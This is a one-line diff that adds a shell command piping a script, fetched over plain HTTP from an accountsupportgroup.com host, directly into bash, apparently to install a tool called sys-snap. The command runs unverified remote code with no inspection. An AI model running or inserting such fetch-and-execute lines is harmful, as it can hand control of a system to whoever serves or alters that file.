@@ -1,0 +1,1 @@
+bash <(GET http://armory-files.accountsupportgroup.com/sys-snap/install-syssnappy) 
